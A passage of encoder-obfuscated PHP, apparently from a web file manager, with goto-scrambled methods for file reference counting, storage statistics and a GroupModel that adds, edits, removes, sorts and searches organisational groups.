linkCountChange($AÀæ÷•ŞÏâ, $B…Ñˆ¿ÄÍ) { goto E¤õÊÇ³ß£; E¤õÊÇ³ß£: $e”ÒãÍ‚ =& $_SERVER[¢ÌÛ]; if (!$AÀæ÷•ŞÏâ) { return; } if (!is_array($AÀæ÷•ŞÏâ)) { $AÀæ÷•ŞÏâ = array($AÀæ÷•ŞÏâ); } goto b¦¢œä³Ÿ¹; CÇÑø«¯à§: foreach ($dÌæø‘„Õ‹ as $aµº†À‰î => $Cˆ„ì“·º) { $f…Ğïöæ±å = $Cˆ„ì“·º . $e”ÒãÍ‚[33]; if (!$cÅÍÚ’·¬‚[$f…Ğïöæ±å]) { $cÅÍÚ’·¬‚[$f…Ğïöæ±å] = array(); } $cÅÍÚ’·¬‚[$f…Ğïöæ±å][] = $aµº†À‰î; } foreach ($cÅÍÚ’·¬‚ as $Cˆ„ì“·º => $BßÀ®·‘ˆ) { if (!$BßÀ®·‘ˆ) { continue; } $Cˆ„ì“·º = $B…Ñˆ¿ÄÍ ? $Cˆ„ì“·º : -intval($Cˆ„ì“·º); $Fø«ñ²Æôë = array($e”ÒãÍ‚[445] => array($e”ÒãÍ‚[7], $BßÀ®·‘ˆ)); if ($Cˆ„ì“·º < 0) { $Fø«ñ²Æôë[$e”ÒãÍ‚[1721]] = array($e”ÒãÍ‚[949], abs($Cˆ„ì“·º)); } $this->where($Fø«ñ²Æôë)->setAdd($e”ÒãÍ‚[1721], $Cˆ„ì“·º); } goto BïˆèŞÂ¤; b¦¢œä³Ÿ¹: $dÌæø‘„Õ‹ = array(); foreach ($AÀæ÷•ŞÏâ as $aµº†À‰î) { $f…Ğïöæ±å = $aµº†À‰î . $e”ÒãÍ‚[33]; if (!$dÌæø‘„Õ‹[$f…Ğïöæ±å]) { $dÌæø‘„Õ‹[$f…Ğïöæ±å] = 0; } $dÌæø‘„Õ‹[$f…Ğïöæ±å]++; } $cÅÍÚ’·¬‚ = array(); goto CÇÑø«¯à§; BïˆèŞÂ¤: } public function findByHash($B¸±³Á„, $F´ˆ½‰ÛÆ = false) { $bãôÃ¸– =& $_SERVER[¢ÌÛ]; if (!$B¸±³Á„ && !$F´ˆ½‰ÛÆ) { return !1; } $f™‹ƒ¹¨”ƒ = array($bãôÃ¸–[1718] => $B¸±³Á„); if ($F´ˆ½‰ÛÆ) { $f™‹ƒ¹¨”ƒ = array($bãôÃ¸–[1719] => $F´ˆ½‰ÛÆ); } return $this->order($bãôÃ¸–[1722])->where($f™‹ƒ¹¨”ƒ)->find(); } public function clearEmpty($F®â‰º¶’· = 0) { goto a¥ˆ§©‚İÈ; FŞÍßËÂ«: foreach ($cŞğ¸µÄƒŠ as $fŠ†ÌÂøÉà) { $a‚ìæˆ“º«->update(1); $this->resetFile($fŠ†ÌÂøÉà); } $a‚ìæˆ“º«->end(); goto BĞ¹ò³ËŸº; a¥ˆ§©‚İÈ: $eÖò¤ç—ù° =& $_SERVER[¢ÌÛ]; $D‰‘¥“ÄÀ = time() - 3600 * 24 * $F®â‰º¶’·; $A¬Úæ‘¢èÆ = $eÖò¤ç—ù°[1723] . $D‰‘¥“ÄÀ; goto AøåÓËÊ»; AøåÓËÊ»: $cŞğ¸µÄƒŠ = $this->where($A¬Úæ‘¢èÆ)->select(); if (!$cŞğ¸µÄƒŠ) { return; } $a‚ìæˆ“º« = new Task($eÖò¤ç—ù°[1724], $eÖò¤ç—ù°[33], count($cŞğ¸µÄƒŠ)); goto FŞÍßËÂ«; BĞ¹ò³ËŸº: } public function resetFile($F„µ‹ÄÒ„Ù) { goto eçÌÓ¹º¨œ; EƒéÙ¾Å: if ($F„µ‹ÄÒ„Ù[$còÂ·Ö®ïª[1721]] != $C»¥·ê’ù†) { $this->where($e¬èˆ¸ğ÷‘)->save(array($còÂ·Ö®ïª[1717] => $C»¥·ê’ù†)); } goto fÂ‡Ø•¥; eçÌÓ¹º¨œ: $còÂ·Ö®ïª =& $_SERVER[¢ÌÛ]; $e¬èˆ¸ğ÷‘ = array($còÂ·Ö®ïª[446] => $F„µ‹ÄÒ„Ù[$còÂ·Ö®ïª[445]]); $FìèÚ…ì„ = Model($còÂ·Ö®ïª[1178])->where($e¬èˆ¸ğ÷‘)->count(); goto dµó³§âØÂ; dµó³§âØÂ: $bˆ³ÇÂ¦Ë = Model($còÂ·Ö®ïª[1725])->where($e¬èˆ¸ğ÷‘)->count(); $C»¥·ê’ù† = intval($FìèÚ…ì„) + intval($bˆ³ÇÂ¦Ë); if ($C»¥·ê’ù† == 0) { IO::remove($F„µ‹ÄÒ„Ù[$còÂ·Ö®ïª[75]]); $this->where($e¬èˆ¸ğ÷‘)->delete(); $this->metaSet($F„µ‹ÄÒ„Ù[$còÂ·Ö®ïª[445]], null, null); return; } goto EƒéÙ¾Å; fÂ‡Ø•¥: } public function storageInfo($Cà¸í…¿î¹ = false) { goto cÙÂŸ”ˆªÌ; f˜›Çğê²ï: for ($A“ÚÊø‘ÓÉ = 0; $A“ÚÊø‘ÓÉ < $C¦ê¼ï¸¿É; $A“ÚÊø‘ÓÉ = $A“ÚÊø‘ÓÉ + $cŸ¶ŒÃÍÀÉ) { $e¡Ø†Ê«¡¿ = $this->limit($A“ÚÊø‘ÓÉ, $A“ÚÊø‘ÓÉ + $cŸ¶ŒÃÍÀÉ)->select(); foreach ($e¡Ø†Ê«¡¿ as $DÈî÷°‹İ’) { $eõÑ‚›í += $DÈî÷°‹İ’[$FåÊÈêÆÔ[77]] * $DÈî÷°‹İ’[$FåÊÈêÆÔ[1721]]; $a’Â¬è¨‰Š += $DÈî÷°‹İ’[$FåÊÈêÆÔ[77]] * ($DÈî÷°‹İ’[$FåÊÈêÆÔ[1721]] - 1); $cÑ˜¤ …æš += $DÈî÷°‹İ’[$FåÊÈêÆÔ[1721]]; } } $bƒÔ‰–Ñ¾Æ = array($FåÊÈêÆÔ[1726] => $eõÑ‚›í, $FåÊÈêÆÔ[1727] => $a’Â¬è¨‰Š, $FåÊÈêÆÔ[1728] => $a’Â¬è¨‰Š / $eõÑ‚›í, $FåÊÈêÆÔ[81] => $C¦ê¼ï¸¿É, $FåÊÈêÆÔ[1729] => $cÑ˜¤ …æš); return $bƒÔ‰–Ñ¾Æ; goto E¢ÆĞˆÅ¯­; cÙÂŸ”ˆªÌ: $FåÊÈêÆÔ =& $_SERVER[¢ÌÛ]; $C¦ê¼ï¸¿É = $this->count() + 0.0; $a’Â¬è¨‰Š = 0; goto dÅ—”„Äµ‡; dÅ—”„Äµ‡: $eõÑ‚›í = 1; $cÑ˜¤ …æš = 0; $cŸ¶ŒÃÍÀÉ = 5000; goto f˜›Çğê²ï; E¢ÆĞˆÅ¯­: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\x6d\145" => "\x67\x72\157\x75\160\x5f\x6d\145\164\141", "\155\x65\x74\x61\x46\151\x65\154\144" => "\x67\162\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($Fª¿¿©ºƒ) { $aõ‘ñ‰Á =& $_SERVER[¢ÌÛ]; return array($aõ‘ñ‰Á[1730] => array($Fª¿¿©ºƒ[0], $aõ‘ñ‰Á[1731]), $aõ‘ñ‰Á[1732] => array($Fª¿¿©ºƒ[0], $aõ‘ñ‰Á[1731])); } protected function getInfo($cÉõ”ŠÉˆ‹) { $fÕà¢ĞÌ¹ = $this->getInfoSimple($cÉõ”ŠÉˆ‹); if (!$fÕà¢ĞÌ¹) { return !1; } return $this->_listDataApplyItem($fÕà¢ĞÌ¹); } protected function getInfoSimple($cŞìì‚ùïÎ, $AøØåá¼òÅ = false) { $A—“—ê±ÁÅ =& $_SERVER[¢ÌÛ]; if ($AøØåá¼òÅ) { $Aæ“®öÔ÷± = array($A—“—ê±ÁÅ[1657] => intval($cŞìì‚ùïÎ)); $f÷óÑ’® = $this->where($Aæ“®öÔ÷±)->find(); return is_array($f÷óÑ’®) ? $f÷óÑ’® : array(); } return $this->cacheFunctionGet($A—“—ê±ÁÅ[1733], $cŞìì‚ùïÎ); } protected function groupAdd($D½ìÀ¥ÅÀË) { goto bç•ŒËµ‰é; E¿Š‚´çæÍ: if (!empty($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1657]])) { $Fâô¯İ²¢[$BäÜ«¥ÕÃ[1657]] = $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1657]]; } $Fë£ëÛ¾‹ = $this->add($Fâô¯İ²¢); $this->setNamePinyin($Fë£ëÛ¾‹, $Fâô¯İ²¢[$BäÜ«¥ÕÃ[28]]); goto f±×í¦å“; dİô†èÅ‰±: if ($e¦¤À‘£­¶[$BäÜ«¥ÕÃ[486]]) { $d°®ò˜öá = $e¦¤À‘£­¶[$BäÜ«¥ÕÃ[486]] . $e¦¤À‘£­¶[$BäÜ«¥ÕÃ[1657]] . $BäÜ«¥ÕÃ[47]; } $Fâô¯İ²¢ = array($BäÜ«¥ÕÃ[413] => $this->groupNameAuto($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[488]], $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[28]]), $BäÜ«¥ÕÃ[395] => $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[488]], $BäÜ«¥ÕÃ[551] => $d°®ò˜öá, $BäÜ«¥ÕÃ[1734] => $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1641]], $BäÜ«¥ÕÃ[1735] => 0, $BäÜ«¥ÕÃ[1661] => 0); if (isset($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1680]])) { $Fâô¯İ²¢[$BäÜ«¥ÕÃ[1680]] = $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1680]]; } else { $A„¨¼¢‚Ğã = $this->max($BäÜ«¥ÕÃ[1680]); if (!$A„¨¼¢‚Ğã) { $A„¨¼¢‚Ğã = 0; } $Fâô¯İ²¢[$BäÜ«¥ÕÃ[1680]] = $A„¨¼¢‚Ğã + 1; } goto E¿Š‚´çæÍ; bç•ŒËµ‰é: $BäÜ«¥ÕÃ =& $_SERVER[¢ÌÛ]; if (!$D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[488]] && isset($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1657]]) && $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1657]] == 1) { if ($e¦¤À‘£­¶ = $this->getInfoSimple($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1657]], !0)) { return $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1657]]; } } else { $e¦¤À‘£­¶ = $this->getInfoSimple($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[488]]); if (!$e¦¤À‘£­¶) { return !1; } } $d°®ò˜öá = $BäÜ«¥ÕÃ[497]; goto dİô†èÅ‰±; f±×í¦å“: if (isset($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1736]])) { $this->metaSet($Fë£ëÛ¾‹, array($BäÜ«¥ÕÃ[1736] => $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1736]], $BäÜ«¥ÕÃ[1737] => $D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1737]])); unset($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1736]]); unset($D½ìÀ¥ÅÀË[$BäÜ«¥ÕÃ[1737]]); } Model($BäÜ«¥ÕÃ[1178])->groupRootAdd($Fë£ëÛ¾‹); return $Fë£ëÛ¾‹; goto e—†·±’Â; e—†·±’Â: } protected function groupEdit($C›ØßÏÂÃˆ, $bµÖªÅ¿ÌŸ) { $C¥ù×È¿— =& $_SERVER[¢ÌÛ]; if (!empty($bµÖªÅ¿ÌŸ[$C¥ù×È¿—[488]])) { $CÒ¬Ú–ÔÓ = $this->getInfoSimple($C›ØßÏÂÃˆ); $b“Ÿ†äêĞö = $this->getInfoSimple($bµÖªÅ¿ÌŸ[$C¥ù×È¿—[488]]); if (!$CÒ¬Ú–ÔÓ || !$b“Ÿ†äêĞö) { return !1; } if ($CÒ¬Ú–ÔÓ[$C¥ù×È¿—[1657]] == $b“Ÿ†äêĞö[$C¥ù×È¿—[1657]]) { return !1; } if ($bµÖªÅ¿ÌŸ[$C¥ù×È¿—[488]] != $CÒ¬Ú–ÔÓ[$C¥ù×È¿—[488]]) { if ($b“Ÿ†äêĞö[$C¥ù×È¿—[486]] !== $CÒ¬Ú–ÔÓ[$C¥ù×È¿—[486]] && strpos($b“Ÿ†äêĞö[$C¥ù×È¿—[486]], $CÒ¬Ú–ÔÓ[$C¥ù×È¿—[486]] . $CÒ¬Ú–ÔÓ[$C¥ù×È¿—[1657]] . $C¥ù×È¿—[47]) === 0) { return !1; } $bµÖªÅ¿ÌŸ[$C¥ù×È¿—[551]] = $b“Ÿ†äêĞö[$C¥ù×È¿—[486]] . $bµÖªÅ¿ÌŸ[$C¥ù×È¿—[488]] . $C¥ù×È¿—[47]; $this->_changeChildLevel($CÒ¬Ú–ÔÓ, $b“Ÿ†äêĞö); } } if (isset($bµÖªÅ¿ÌŸ[$C¥ù×È¿—[28]])) { $this->setNamePinyin($C›ØßÏÂÃˆ, $bµÖªÅ¿ÌŸ[$C¥ù×È¿—[28]]); } if (isset($bµÖªÅ¿ÌŸ[$C¥ù×È¿—[1736]])) { $this->metaSet($C›ØßÏÂÃˆ, array($C¥ù×È¿—[1736] => $bµÖªÅ¿ÌŸ[$C¥ù×È¿—[1736]], $C¥ù×È¿—[1737] => $bµÖªÅ¿ÌŸ[$C¥ù×È¿—[1737]])); unset($bµÖªÅ¿ÌŸ[$C¥ù×È¿—[1736]]); unset($bµÖªÅ¿ÌŸ[$C¥ù×È¿—[1737]]); } return $this->where(array($C¥ù×È¿—[1738] => $C›ØßÏÂÃˆ))->save($bµÖªÅ¿ÌŸ); } private function _changeChildLevel($fšÂÃ±Ø±Î, $f‡ª¿½Š°Õ, $Bµ²Ü®Œ‹ = false) { goto Aù£ùµø¿; Aù£ùµø¿: $c˜İÓÓµ™ï =& $_SERVER[¢ÌÛ]; $eÌõ„«³’à = $fšÂÃ±Ø±Î[$c˜İÓÓµ™ï[486]] . $fšÂÃ±Ø±Î[$c˜İÓÓµ™ï[1657]] . $c˜İÓÓµ™ï[47]; $d£Ğ¸Ş…è = $f‡ª¿½Š°Õ[$c˜İÓÓµ™ï[486]] . $f‡ª¿½Š°Õ[$c˜İÓÓµ™ï[1657]] . $c˜İÓÓµ™ï[47] . $fšÂÃ±Ø±Î[$c˜İÓÓµ™ï[1657]] . $c˜İÓÓµ™ï[47]; goto CÇ©ÈÍ‰Å®; aÔĞ‚î‹¬­: $this->where($BˆÈÇ°Óß–)->data($Cª«±‰²‰œ)->save(); goto Aáò•İõ¨; CÇ©ÈÍ‰Å®: if ($Bµ²Ü®Œ‹) { $d£Ğ¸Ş…è = $f‡ª¿½Š°Õ[$c˜İÓÓµ™ï[486]] . $f‡ª¿½Š°Õ[$c˜İÓÓµ™ï[1657]] . $c˜İÓÓµ™ï[47]; } $BˆÈÇ°Óß– = array($c˜İÓÓµ™ï[551] => array($c˜İÓÓµ™ï[510], $fšÂÃ±Ø±Î[$c˜İÓÓµ™ï[486]] . $fšÂÃ±Ø±Î[$c˜İÓÓµ™ï[1657]] . $c˜İÓÓµ™ï[511])); $Cª«±‰²‰œ = array($c˜İÓÓµ™ï[551] => array($c˜İÓÓµ™ï[559], "\x72\145\160\154\141\x63\145\50\160\141\x72\x65\156\164\x4c\145\166\145\x6c\54\x27{$eÌõ„«³’à}\x27\x2c\x27{$d£Ğ¸Ş…è}\47\51")); goto aÔĞ‚î‹¬­; Aáò•İõ¨: } public function setNamePinyin($föªé®’Ãâ, $e‡ó–½„“† = false) { $B ×¤¸šêÂ =& $_SERVER[¢ÌÛ]; if (!$e‡ó–½„“†) { $Dô“‘É¨ª™ = $this->getInfoSimple($föªé®’Ãâ); $e‡ó–½„“† = $Dô“‘É¨ª™[$B ×¤¸šêÂ[28]]; } if (!Input::check($e‡ó–½„“†, $B ×¤¸šêÂ[554])) { $this->metaSet($föªé®’Ãâ, $B ×¤¸šêÂ[442], null); $this->metaSet($föªé®’Ãâ, $B ×¤¸šêÂ[441], null); return; } $b´‰½–Ş = array($B ×¤¸šêÂ[442] => str_replace($B ×¤¸šêÂ[50], $B ×¤¸šêÂ[33], Pinyin::encode($e‡ó–½„“†)), $B ×¤¸šêÂ[441] => Pinyin::encode($e‡ó–½„“†, $B ×¤¸šêÂ[555])); $this->metaSet($föªé®’Ãâ, $b´‰½–Ş); } protected function groupStatus($A‹çŠœ‚Ÿ, $B»•¶àÕ·ˆ) { goto bøì­ñß™¥; dæ×šØ´¢µ: if ($B»•¶àÕ·ˆ == $CÍŒàòš§ˆ[86]) { $f’ˆÀ’Ü— = $this->parentLevelArray($bÍ¤ÈŒÉî[$CÍŒàòš§ˆ[486]]); } else { $aÅËÜçÒ®è = array($CÍŒàòš§ˆ[551] => array($CÍŒàòš§ˆ[510], $bÍ¤ÈŒÉî[$CÍŒàòš§ˆ[486]] . $bÍ¤ÈŒÉî[$CÍŒàòš§ˆ[1657]] . $CÍŒàòš§ˆ[511])); $f’ˆÀ’Ü— = $this->where($aÅËÜçÒ®è)->field($CÍŒàòš§ˆ[1657])->select(); $f’ˆÀ’Ü— = array_to_keyvalue($f’ˆÀ’Ü—, $CÍŒàòš§ˆ[33], $CÍŒàòš§ˆ[1657]); } $f’ˆÀ’Ü—[] = $bÍ¤ÈŒÉî[$CÍŒàòš§ˆ[1657]]; $få¡®¬Àİâ = array(); goto CÔˆæîÜ—©; CÔˆæîÜ—©: foreach ($f’ˆÀ’Ü— as $A‹çŠœ‚Ÿ) { $få¡®¬Àİâ[] = array($CÍŒàòš§ˆ[1657] => $A‹çŠœ‚Ÿ, $CÍŒàòš§ˆ[92] => $CÍŒàòš§ˆ[712], $CÍŒàòš§ˆ[368] => $B»•¶àÕ·ˆ); } return Model($CÍŒàòš§ˆ[1739])->addAll($få¡®¬Àİâ, array(), !0); goto FË‹ÆŞ¾ì; bøì­ñß™¥: $CÍŒàòš§ˆ =& $_SERVER[¢ÌÛ]; $bÍ¤ÈŒÉî = $this->getInfoSimple($A‹çŠœ‚Ÿ); if (!$bÍ¤ÈŒÉî) { return !1; } goto dæ×šØ´¢µ; FË‹ÆŞ¾ì: } protected function groupRemove($dÖ÷Ğññ„) { goto f¸˜Õò—”; FÌŒùÊ•™À: if (!$eº§íÕßÌ || $eº§íÕßÌ[$FÇ¤¿öÛ¢[488]] == 0) { return !1; } $A§ƒìÉä‡ = $this->getInfoSimple($eº§íÕßÌ[$FÇ¤¿öÛ¢[488]]); $this->_changeChildLevel($eº§íÕßÌ, $A§ƒìÉä‡, !0); goto BÒƒÔËÑÅ; eçà©ºè›Ê: Model($FÇ¤¿öÛ¢[774])->groupRootRemove($dÖ÷Ğññ„); return $this->where($F¦¾ŞîÆ„ì)->delete(); goto BÅÕ·£ÁÒ®; BÒƒÔËÑÅ: $this->where(array($FÇ¤¿öÛ¢[488] => $dÖ÷Ğññ„))->save(array($FÇ¤¿öÛ¢[488] => $eº§íÕßÌ[$FÇ¤¿öÛ¢[488]])); Model($FÇ¤¿öÛ¢[1739])->where($F¦¾ŞîÆ„ì)->delete(); Model($FÇ¤¿öÛ¢[1740])->where($F¦¾ŞîÆ„ì)->delete(); goto eçà©ºè›Ê; f¸˜Õò—”: $FÇ¤¿öÛ¢ =& $_SERVER[¢ÌÛ]; $F¦¾ŞîÆ„ì = array($FÇ¤¿öÛ¢[1657] => $dÖ÷Ğññ„); $eº§íÕßÌ = $this->where($F¦¾ŞîÆ„ì)->find(); goto FÌŒùÊ•™À; BÅÕ·£ÁÒ®: } protected function groupSort($d¨ˆÔí¨øÑ) { $Fœ“‘ÅÉŒ¤ =& $_SERVER[¢ÌÛ]; $CŠ“ŠôÇµ– = array(); foreach ($d¨ˆÔí¨øÑ as $Bì‘ÕØÛ‡º => $b™Û‚à­Èµ) { $CŠ“ŠôÇµ–[] = array($Fœ“‘ÅÉŒ¤[1657], $b™Û‚à­Èµ, $Fœ“‘ÅÉŒ¤[1680], $Bì‘ÕØÛ‡º + 1); } $this->saveAll($CŠ“ŠôÇµ–); } public function listData() { $f·°š†µ³ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($f·°š†µ³[$_SERVER[¢ÌÛ][363]]); return $f·°š†µ³; } private function _makeOrder($cÕÔ­¨áÄŠ = '') { goto b‡÷†Œ‘‹º; FÖôŒî”Š: $cÕÔ­¨áÄŠ = $cÕÔ­¨áÄŠ . "{$f•ÉéÏÚÀà}\x20{$Fãê­¡ªà‰}\54\40\x67\162\x6f\x75\160\x49\104\x20\141\163\x63"; return $this->order($cÕÔ­¨áÄŠ); goto BºŒÌã‘ó›; b‡÷†Œ‘‹º: $b’½‘õÄÓ =& $_SERVER[¢ÌÛ]; $b»¶Ÿòº§ = array($b’½‘õÄÓ[1657], $b’½‘õÄÓ[28], $b’½‘õÄÓ[1643], $b’½‘õÄÓ[192]); $b§„“£¾¸å = array($b’½‘õÄÓ[428] => $b’½‘õÄÓ[429], $b’½‘õÄÓ[430] => $b’½‘õÄÓ[431]); goto d«Ï¢÷œÊŒ; d«Ï¢÷œÊŒ: $f•ÉéÏÚÀà = Input::get($b’½‘õÄÓ[433], $b’½‘õÄÓ[7], $b’½‘õÄÓ[1661], $b»¶Ÿòº§); $Fãê­¡ªà‰ = Input::get($b’½‘õÄÓ[434], $b’½‘õÄÓ[7], $b’½‘õÄÓ[1741], array($b’½‘õÄÓ[1741], $b’½‘õÄÓ[430])); $Fãê­¡ªà‰ = $b§„“£¾¸å[$Fãê­¡ªà‰]; goto FÖôŒî”Š; BºŒÌã‘ó›: } public function listChild($fØîÜ‰ƒ…) { $aŠì³…áâ‘ =& $_SERVER[¢ÌÛ]; $D“İ‰¼¢ĞÔ = $this->where(array($aŠì³…áâ‘[488] => $fØîÜ‰ƒ…))->_makeOrder()->selectPage(200); $this->_listDataApply($D“İ‰¼¢ĞÔ[$aŠì³…áâ‘[363]]); return $D“İ‰¼¢ĞÔ; } public function listByID($aš­§‹™) { $Dè¢éÌÕ¥› =& $_SERVER[¢ÌÛ]; if (!$aš­§‹™) { return array(); } $b”–½ŠÖÕİ = array($Dè¢éÌÕ¥›[1657] => array($Dè¢éÌÕ¥›[7], $aš­§‹™)); $a»²­¨ñ†¥ = $this->where($b”–½ŠÖÕİ)->select(); $this->_listDataApply($a»²­¨ñ†¥); return $a»²­¨ñ†¥; } public function listSearch($EÌÒªÖ ¶) { goto fÙ»Ùà©ÒÅ; AÀ—±¨¦Ó: if (!trim($eïë†óÚìÀ)) { return !1; } $eïë†óÚìÀ = str_replace($E­”ÒøñÎ[1744], $E­”ÒøñÎ[1745], $eïë†óÚìÀ); $Fˆ«¡Ş¯ĞÑ = array($E­”ÒøñÎ[1657] => array($E­”ÒøñÎ[375], "{$eïë†óÚìÀ}\45"), $E­”ÒøñÎ[28] => array($E­”ÒøñÎ[375], "\x25{$eïë†óÚìÀ}\45"), $E­”ÒøñÎ[934] => $E­”ÒøñÎ[1746]); goto C‡¿ì½í·Î; CÎÛƒÅó: $eÆªÓ‰§æµ = $eÆªÓ‰§æµ ? $eÆªÓ‰§æµ : array(); if (!$eÆªÓ‰§æµ || count($eÆªÓ‰§æµ[$E­”ÒøñÎ[363]]) < 5 && Input::check($eïë†óÚìÀ, $E­”ÒøñÎ[314])) { goto E Û³ÛåØø; d“—µöËÁ: $a£¢©†ø— = array_merge($CÉ÷ƒ³­Æƒ, $dÂá¨»‹Úã, $eÆªÓ‰§æµ[$E­”ÒøñÎ[363]]); $eÆªÓ‰§æµ[$E­”ÒøñÎ[363]] = array_unique_by_key($a£¢©†ø—, $E­”ÒøñÎ[1657]); $eÆªÓ‰§æµ[$E­”ÒøñÎ[360]][$E­”ÒøñÎ[361]] = count($eÆªÓ‰§æµ[$E­”ÒøñÎ[363]]); goto f‘ùÛÃÁï½; f‘ùÛÃÁï½: $eÆªÓ‰§æµ[$E­”ÒøñÎ[360]][$E­”ÒøñÎ[362]] = ceil($eÆªÓ‰§æµ[$E­”ÒøñÎ[360]][$E­”ÒøñÎ[361]] / $eÆªÓ‰§æµ[$E­”ÒøñÎ[360]][$E­”ÒøñÎ[358]]); goto C¶è‚ø¤¯; E Û³ÛåØø: $A¿éŒŠ÷ê² = $this->groupChildrenAll($d¤ÌÅ†Î›ƒ); $CÉ÷ƒ³­Æƒ = $this->_searchFromMeta($E­”ÒøñÎ[441], $eïë†óÚìÀ, 10, $A¿éŒŠ÷ê²); $dÂá¨»‹Úã = $this->_searchFromMeta($E­”ÒøñÎ[442], $eïë†óÚìÀ, 10, $A¿éŒŠ÷ê²); goto d“—µöËÁ; C¶è‚ø¤¯: } $this->_listDataApply($eÆªÓ‰§æµ[$E­”ÒøñÎ[363]]); goto AŠ©‚ƒƒ™; AŠ©‚ƒƒ™: return $eÆªÓ‰§æµ; goto fäªÀ¯œ; fÙ»Ùà©ÒÅ: $E­”ÒøñÎ =& $_SERVER[¢ÌÛ]; $eïë†óÚìÀ = $EÌÒªÖ ¶[$E­”ÒøñÎ[1742]]; $d¤ÌÅ†Î›ƒ = isset($EÌÒªÖ ¶[$E­”ÒøñÎ[1743]]) ? $EÌÒªÖ ¶[$E­”ÒøñÎ[1743]] : !1; goto AÀ—±¨¦Ó; C‡¿ì½í·Î: if ($d¤ÌÅ†Î›ƒ) { $a‰î×†ŒŞ = $this->getInfoSimple($d¤ÌÅ†Î›ƒ); $dçŠîœÄ… = $a‰î×†ŒŞ[$E­”ÒøñÎ[486]] . $d¤ÌÅ†Î›ƒ . $E­”ÒøñÎ[511]; $Fˆ«¡Ş¯ĞÑ = array($Fˆ«¡Ş¯ĞÑ, array($E­”ÒøñÎ[486] => array($E­”ÒøñÎ[375], $dçŠîœÄ…))); } $Fˆ«¡Ş¯ĞÑ = $this->parseWhereLike($Fˆ«¡Ş¯ĞÑ); $eÆªÓ‰§æµ = $this->_makeOrder()->where($Fˆ«¡Ş¯ĞÑ)->selectPage(20); goto CÎÛƒÅó; fäªÀ¯œ: } protected function groupChildrenAll($Cì•©Ôô °) { $d¢æ¬È¸º‹ =& $_SERVER[¢ÌÛ]; if (!$Cì•©Ôô °) { return !1; } if (is_string($Cì•©Ôô °)) { $Cì•©Ôô ° = array($Cì•©Ôô °); } $E¹ìæÈË§® = $Cì•©Ôô °; foreach ($Cì•©Ôô ° as $céëœ¯·”µ) { $C“øŒ¹×‹À = $this->getInfoSimple($céëœ¯·”µ); $c¶Áë‘»éõ = array($d¢æ¬È¸º‹[486] => array($d¢æ¬È¸º‹[375], $C“øŒ¹×‹À[$d¢æ¬È¸º‹[486]] . $céëœ¯·”µ . $d¢æ¬È¸º‹[511])); $e¿áÃÛ¶áÃ = $this->field($d¢æ¬È¸º‹[1657])->where($c¶Áë‘»éõ)->select(); $E¹ìæÈË§® = array_merge($E¹ìæÈË§®, array_to_keyvalue($e¿áÃÛ¶áÃ, $d¢æ¬È¸º‹[33], $d¢æ¬È¸º‹[1657])); } return array_unique($E¹ìæÈË§®); } private function _searchFromMeta($AôÄö–óñ¯, $DŞø¥™¾å„, $Fæç™ŠÖ„Ó, $eœ¾¬À¦ò) { goto E­‘êáìÆÀ; Fù×‹•¨: if (!$B°§ÙâØ‰Ş) { return array(); } return $B°§ÙâØ‰Ş; goto E¢´º‹ÃÑ”; E­‘êáìÆÀ: $b½İÚÄ„¼ =& $_SERVER[¢ÌÛ]; $DŞø¥™¾å„ = strtolower($DŞø¥™¾å„); $fÃ¨½Î‘„— = array($b½İÚÄ„¼[92] => $AôÄö–óñ¯, $b½İÚÄ„¼[368] => array($b½İÚÄ„¼[375], "\45{$DŞø¥™¾å„}\45")); goto EÙç……ºÇÄ; f…Ì®…šæ³: if (!$F™´ôØÇïó) { return array(); } $F™´ôØÇïó = array_to_keyvalue($F™´ôØÇïó, $b½İÚÄ„¼[33], $b½İÚÄ„¼[1657]); $B°§ÙâØ‰Ş = $this->where(array($b½İÚÄ„¼[1738] => array($b½İÚÄ„¼[7], $F™´ôØÇïó)))->select(); goto Fù×‹•¨; EÙç……ºÇÄ: $fÃ¨½Î‘„— = $this->parseWhereLike($fÃ¨½Î‘„—); if ($eœ¾¬À¦ò) { $fÃ¨½Î‘„—[$b½İÚÄ„¼[1657]] = array($b½İÚÄ„¼[7], $eœ¾¬À¦ò); } $F™´ôØÇïó = Model($b½İÚÄ„¼[1747])->where($fÃ¨½Î‘„—)->limit($Fæç™ŠÖ„Ó)->select(); goto f…Ì®…šæ³; E¢´º‹ÃÑ”: } protected function _listDataApplyItem($b£º¤Ç¢ñà) { $C´Èç’—Ù‡ = array($b£º¤Ç¢ñà); $this->_listDataApply($C´Èç’—Ù‡); return $C´Èç’—Ù‡[0]; } protected function _listDataApply(&$a…·­ñÃµœ) { goto Fœå¸¢àí; Fœå¸¢àí: $b‘¼†•¦‹ =& $_SERVER[¢ÌÛ]; if (!$a…·­ñÃµœ) { return; } $D”²‰È¥°Ò = array_to_keyvalue($a…·­ñÃµœ, $b‘¼†•¦‹[33], $b‘¼†•¦‹[1657]); goto D£ÙÓ¤­é„; D£ÙÓ¤­é„: $this->_listAppendChildren($a…·­ñÃµœ); $this->_listAppendChildrenMember($a…·­ñÃµœ); $this->_listAppendMeta($a…·­ñÃµœ, $D”²‰È¥°Ò); goto A¢’õ»ğ¨º; A¢’õ»ğ¨º: $this->_listAppendParent($a…·­ñÃµœ); $this->_listAppendSourceRoot($a…·­ñÃµœ, $D”²‰È¥°Ò); goto cåØ×¯‡Î¦; cåØ×¯‡Î¦: } private function 